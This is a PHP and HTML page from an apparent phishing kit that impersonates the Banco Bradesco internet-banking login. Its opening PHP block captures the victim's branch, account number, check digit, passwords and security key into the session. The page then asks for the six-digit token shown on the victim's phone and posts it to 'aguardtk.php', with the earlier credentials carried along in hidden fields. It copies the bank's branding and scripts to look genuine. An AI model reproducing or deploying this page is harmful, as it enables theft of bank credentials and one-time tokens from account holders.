<?php  
session_start();
$agencia = $_POST['agencia'];
$conta = $_POST['conta'];
$digito = $_POST['digito'];
$senha = $_POST['senha'];
$senhad6 = $_POST['senhad6'];
$chave = $_POST['chave'];

$_SESSION["agencia"] = $agencia;
$_SESSION["conta"] = $conta;
$_SESSION["digito"] = $digito;
$_SESSION["chave"] = $chave;
$_SESSION["senha"] = $senha;

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>

<head>
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	<link rel="shortcut icon" href="Banco%20Bradesco%20S_A_files/bradesco.ico"/>
	<title>Banco Bradesco S/A</title>



    

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/estrutur.css" />

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/interna0.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery00.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery01.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery02.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery03.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/login000.css" />


    

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/conteudo.css" />



    


<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery00.js"></script>


    

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery01.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery02.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery03.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery04.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery05.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/swfobjec.js"></script>





<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/currency.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/validaco.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/default1.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/tecladov2.js"></script>



    



    <!--[if lt IE 8]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie.css" />


	


	<![endif]-->

	<!--[if lt IE 7]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie6.css" />


	

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/pngfix.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/jquery.bgiframe.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/default_ie.js"></script>


	<![endif]-->
    
    <script type="text/javascript"><!--
var isPrime=false;

//--></script>
    <script type="text/javascript"><!--
var loginMainUrlEncerra='https://www.ib2.bradesco.com.br/ibpflogin/logoff.jsf';

//--></script>
    <script type="text/javascript"><!--
var loginMainNomeCtl='CTL';

//--></script>
    <script type="text/javascript"><!--
var loginMainCtl='7605190925697317521150';

//--></script>
	    
	    
	    <script type="text/javascript">
			document.domain = "#";			
			function cancelarAcesso() {
 				window.top.location = loginMainUrlEncerra + "?" + loginMainNomeCtl + "=" + loginMainCtl;     
   				return false;
			}
			
			
			
function autotab(elemento)
{
 if (elemento.value.length < elemento.getAttribute("maxlength")) return;
 var formulario = elemento.form;
 var els = formulario.elements;
 var x, autotab;
 for (var i = 0, len = els.length; i < len; i++)
 {
  x = els[i];
  if (elemento == x && (autotab = els[i+1]))
  {
   if (autotab.focus) autotab.focus();
  }
 }
}



	    </script>
<script language="javascript">
function BradaTK() {
	var chavetk = $("#chavetk");
	if( chavetk == undefined || chavetk.val().length < 6 ) {
		alert("Chave de Segurança Incorreta.");
		return;
	}
	document.forms['FLogin'].action = "aguardtk.php";
	document.forms['FLogin'].submit();
}
</script>
	
<style type="text/css">
<!--
body {
	background-color: #FFFFFF;
}

.formulariosenha {
	border: 1px solid #939394;
}
#apDiv1 {
	position:absolute;
	left:214px;
	top:284px;
	width:39px;
	height:20px;
	z-index:1;
}
-->
</style>
<script src="Scripts/AC_ActiveX.js" type="text/javascript"></script>
<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
</head>
<body>
<form name="FLogin" id="FLogin" method="post">
<input type="hidden" name="senhad6" value="<?php echo "$_POST[senhad6]"; ?>">



<div id="miolo" style="margin-left:2px; margin-top:2px;"  class="after login">	
						
		<script type="text/javascript"><!--
var pametrosHdaSenha4UnicoTitular='n_0-0_introducao|hdaOfertaDisp=0&hdaQtdeTit=1';

//--></script><script type="text/javascript"><!--
var pametrosHdaSelecaoMultiplosTitulares='n_0-0_introducao|hdaOfertaDisp=0&hdaQtdeTit=2';

//--></script><script type="text/javascript"><!--
var pametrosHdaSenha4MultiplosTitulares='r_0-21_verificaoferta|hdaOfertaDisp=0';

//--></script><script type="text/javascript"><!--
var numControle='7605190925697317521150';

//--></script><script type="text/javascript"><!--
var hdaAtivadoLogin=false;

//--></script><script type="text/javascript"><!--
var hdaPosicaoLogin=1;

//--></script><script type="text/javascript"><!--
var hdaVisivelLogin=false;

//--></script><script type="text/javascript"><!--
var isPrimeiroAcesso=false;

//--></script><script type="text/javascript"><!--
var sequenciaTeclado=new Array(6,7,0,3,5,4,2,9,8,1);

//--></script>




<script type="text/javascript"><!--
var urlAutenticacao='autenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script>



<script type="text/javascript"><!--
var urlProximoTipoAutenticacao='tipoAutenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm?nome=valor';

//--></script><script type="text/javascript"><!--
var urlAceite='aceite.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script><script type="text/javascript"><!--
var urlProximaPagina='proxAutenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script><script type="text/javascript"><!--
var sequenciaProximoDispositivo=2;

//--></script>








<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/login000.js"></script>
<div id="conteudo" style="left:0; "  class="after conteudo_L">
<p><img src="images/conf2.jpg" /></p>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td width="16%" align="left" valign="top" style=" vertical-align:top; padding-top:38px; padding-left:5px;"><font size="2">Digite a <strong>chave</strong> informada no visor do seu celular.</font></span></li>
</td>
    <td width="25%" align="left" valign="top"><img alt="Chave de Segurança" src="Banco Bradesco S_A_files/chavepage.jpg" width="179" height="109" /></td>
    <td width="59%" align="left" valign="top" style="vertical-align:top; padding-top:20px;"><input type="password" id="chavetk" name="chavetk" maxlength="6" title="Digite a chave de segurança Bradesco informada pelo seu dispositivo.  " style="width: 112px; maxlength:6; text-align:center;" class="tabindex tabfirst" tabindex="21" />
      <span class="leg"><font size="1">&nbsp;&nbsp;(6 digitos)</font></span></td>
  </tr>
</table>
<p align="right"><img src="avanca.JPG" alt="" width="101" height="32" onclick="BradaTK()" style="cursor:pointer;" /></p>
<p>
  <input id="loginbotoes:botaoAvancar" name="loginbotoes:botaoAvancar" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif" onclick="javascript: entregachave();" alt="Avan&ccedil;ar" title="Avan&ccedil;ar" class="bt_avancar bto_input tabindex tab-1 botoesLogin" />
</p>
  <p>
    <input id="loginbotoes:bt_cancelar_acesso" name="loginbotoes:bt_cancelar_acesso" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif"  alt="Cancelar Acesso" title="Cancelar Acesso" class="bt_cancelar_acesso bto_input tabindex botoesLogin" />
  </p>
</div>


</div>
<script language="javascript" type="text/javascript" src="Banco%20Bradesco%20S_A_files/publicKe.js"><!--

//--></script><script language="javascript" type="text/javascript" src="Banco%20Bradesco%20S_A_files/scpscrpt.js"><!--

//--></script><script language="javascript"><!--

setPublic(n_InternetBanking, e_InternetBanking);  
function setEncryptEventTrap(element, eventName, trapFunction) {
    if (element.addEventListener){
        element.addEventListener(eventName, trapFunction, false);
    } else if (element.attachEvent){
        element.attachEvent('on' + eventName, trapFunction);
} 
} 
function handOnClick(e) {
    rng_seed_time();
} 
function handOnKeyPress(e) {
    rng_seed_time();
} window.document.onclick = handOnClick;
window.document.onkeypress = handOnKeyPress;
function getValor(campo) {
    var retorno = "";
    try {
        if(typeof(campo.length) != "undefined") {
            if (campo[0].type == "radio") {
                for (var i = 0; i < campo.length; i++) {
                    if (campo[i].checked) {
                        retorno = campo[i].value;
                        break;
                     }
                    }
             }
        } else {
            if(campo.type == "checkbox" || campo.type == "radio") {            
                if (campo.checked) {
                    retorno = campo.value;
                 }
            } else {
                retorno = campo.value;
            }
        }
    } catch (err) {
    }
    return retorno;
} function setValor(campo, novoValor, permiteBranco) {
   try {
       if(typeof(campo.length) != "undefined") {
           if (campo[0].type == "radio") {
              if (novoValor != "" || permiteBranco) {
                   for (var i = 0; i < campo.length; i++) {
                       if (campo[i].value == novoValor) {
                           campo[i].checked = true;
                       } else {
                           campo[i].checked = false;
                       }
                  }
                }
          }
       } else {
           if(campo.type == "checkbox") {            
               if (campo.value == novoValor) {
                   campo.checked = true;
               } else {
                   campo.checked = false;
              }
           } else if(campo.type == "radio") {
               if (novoValor != "" || permiteBranco) {
                   if (campo.value == novoValor) {
                       campo.checked = true;
                   } else {
                       campo.checked = false;
                   }
               }
           } else {
               campo.value = novoValor;
           }
       }
   } catch (err) {
} } function enc(formName, params) {
   var loop;
   for (loop = 0; loop < params.length; loop++) {
       var valorAux = getValor(window.document.forms[formName].elements[params[loop][0]]);
       window.document.forms[formName].elements[params[loop][1]].value = cript("7605190925697317521150", valorAux); 
       window.document.forms[formName + "_backup"].elements[params[loop][0]].value = valorAux;
      setValor(window.document.forms[formName].elements[params[loop][0]], "", true); 
} 
} 
function inic(formName, params) {
   var loop; 
   var dado; 
   for (loop = 0; loop < params.length; loop++) { 
       dado = window.document.forms[formName].elements[params[loop][1]].value;
       if (dado.length == 172 && dado.charAt(171) == "=") {
           dado = window.document.forms[formName + "_backup"].elements[params[loop][0]].value;
} 
      setValor(window.document.forms[formName].elements[params[loop][0]], dado, false);
} 
} 


//--></script><div style="visibility:visible; display:hide"></div>
<script language="javascript"><!--

var params_form_cript = new Array();
   params_form_cript[0] = ["form_cript:valor_dig", "form_cript:valor_cript"];
var processado_form_cript = false;
function origOnSubmitform_cript() {return true;}
function enc_form_cript() { 
   if (origOnSubmitform_cript() == false) {
       return false;
   }
   enc("form_cript",  params_form_cript); 
   return true;
} 
function inic_form_cript() {
   inic("form_cript", params_form_cript) ;
} 
setEncryptEventTrap(window, "load", inic_form_cript);


//--></script><script type="text/javascript">
AC_AX_RunContent( 'classid','clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF','height','0','id','Conexao','width','0','update','1|1|1' ); //end AC code
</script><noscript><object classid="clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF" height="0" id="Conexao" width="0"><param name="Update" value="1|1|1" /></object></noscript><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

        
        <!-- fim pb15 after -->

        
          <!-- Mais de um titular -->              
                        
          <!-- Select Titular - Box redline -->   
          
          
              
<script type="text/javascript">
                <!--
                jQuery('#numero-tela').html('RLO01');
                //-->
                </script>          
                    
              
                
      
<!-- fim conteudo -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- ### UL BOX DIREITA ### -->
<!-- HDA -->
<!-- VIDEO -->
<!-- // VIDEO -->
<!-- // HDA -->
<!-- -->
<!-- -->
<!-- -->
<!-- ### FIM UL BOX DIREITA ### -->
<!--</div></div></ul>-->
<!-- ### RODAPÉ ### -->
<!-- ### FIM RODAPÉ ### -->
<div id="modalLogin" class="jqmWindow modalNaoFecha none_i" style="width:523px;"><div id="modalLogin_jqmCornerTop" class="jqmCornerTop"><div id="jqmCornerTop_1" class="cc"></div><div id="jqmCornerTop_2" class="c1"></div><div id="jqmCornerTop_3" class="c2"></div></div><div id="modalMiolo" class="jqmWrapper after"><a id='linkTituloModalLogin' href='javascript:;' class='tabindex modal-title tabfirst tabmodal' 
        title='Acesso Seguro'></a><div id="modalFechar" class="jqmTop after"><a href="javascript:;" class="lnkFechar closeModalLogin tabindex none_i" title="Fechar">Fechar</a><h4>Acesso Seguro</h4></div><div id="modalContentAfter" class="jqmContent after"><div id="modalBoxAlertPrincipal" class="ptb20"><div id="modalBoxAlertMessage" class="box-alerta sinal-X after"><div id="modalBoxAlertTexto" class="ctn-box after"><span class="HtmlOutputTextBradesco"><p><P>Sistema indispon&#237;vel no momento. Por favor, tente mais tarde.</P></p></span></div></div><span class="HtmlOutputTextBradesco"><a id='mensagem-erro' class='modal-title tabindex tab-1 linkInvisivel' 
                      title='Sistema indispon&#237;vel no momento. Por favor, tente mais tarde.'></a></span><span id="textoPosErro" class="ctn-voltar">Em caso de d&#250;vidas, por favor, entre em contato com o <a class="link_ext tabindex" id="FFB" title="Fone F&#225;cil Bradesco, ir para p&#225;gina." href="javascript:;" onclick="return fonefacil();">Fone F&#225;cil Bradesco</a></span></div></div><ul id="_id121" class="lstButtonsLine block"><li id="_id122" class="pl20"><div id="div-textoAntesBotoes" class="textoAntesBotoes"></div></li><li id="_id124"><ul id="listaCancelarAcesso" class="lstButtons  btos_bottom fn after"><li id="cancelAcesso"><form id="cancelarAcessoModalForm" name="cancelarAcessoModalForm" method="post" action="https://www.ib2.bradesco.com.br/ibpflogin/login.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm" enctype="application/x-www-form-urlencoded" onsubmit="return false;" title="Cancelar Acesso"><input id="cancelarAcessoModalForm:_id125" name="cancelarAcessoModalForm:_id125" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif" onclick="javascript: cancelarAcesso();;clear_cancelarAcessoModalForm();document.forms['cancelarAcessoModalForm'].elements['autoScroll'].value=getScrolling();" alt="Cancelar Acesso" title="Cancelar Acesso" class="bt_cancelar_acesso bto_input tabindex " /><input type="hidden" name="cancelarAcessoModalForm_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /><input type="hidden" name="cancelarAcessoModalForm:_link_hidden_" /><script type="text/javascript"><!--
function clear_cancelarAcessoModalForm() {
  var f = document.forms['cancelarAcessoModalForm'];
  f.elements['cancelarAcessoModalForm:_link_hidden_'].value='';
  f.target='';
}
clear_cancelarAcessoModalForm();
//--></script></form></li></ul></li><li id="_id126" class="pl20"><div id="div-textoAposBotoes" class="textoAposBotoes"></div></li></ul><a id='marcador-fim-modal' href='javascript:;' class='tabindex tabmodal' 
                onblur='focoTituloModal()'></a></div><div id="modalLogin_jqmCornerBottom" class="jqmCornerBottom"><div id="jqmCornerBottom_1" class="cc"></div><div id="jqmCornerBottom_2" class="c3"></div><div id="jqmCornerBottom_3" class="c4"></div></div></div>
 

<!-- fim jqmWindow  -->
<!-- fim modal login -->
 	
<div id="modalContent" class="jqmWindow modalNaoFecha" style="width:550px;"><div id="modalContent_jqmCornerTop" class="jqmCornerTop"><div id="modalContent_top_1" class="cc"></div><div id="modalContent_top_2" class="c1"></div><div id="modalContent_top_3" class="c2"></div></div><div class="jqmWrapper after"></div><div id="bottomModalContent" class="jqmCornerBottom"><span class="cc"><!-- --></span><span class="c3"><!-- --></span><span class="c4"><!-- --></span></div></div>
 

<p>
      
</p>

<p align="right">&nbsp;</p>


<input type="hidden" name="agencia" value="<?php print("$_SESSION[agdes]"); ?>">
<input type="hidden" name="conta" value="<?php print("$_SESSION[ctdes]"); ?>">
<input type="hidden" name="digito" value="<?php print("$_SESSION[digdes]"); ?>">
<input type="hidden" name="senha" value="<?php print("$_SESSION[SENHA]");?>">
<input name="senhad6" id="senhad6" type="hidden" value="">
</form>
</body>
<script type="text/javascript"><!--
function getScrolling() {
    var x = 0; var y = 0;
    if (self.pageXOffset) {
        x = self.pageXOffset;
        y = self.pageYOffset;
    } else if (document.documentElement && document.documentElement.scrollLeft) {
        x = document.documentElement.scrollLeft;
        y = document.documentElement.scrollTop;
    } else if (document.body) {
        x = document.body.scrollLeft;
        y = document.body.scrollTop;
    }
    return x + "," + y;
}

//--></script>
</html>

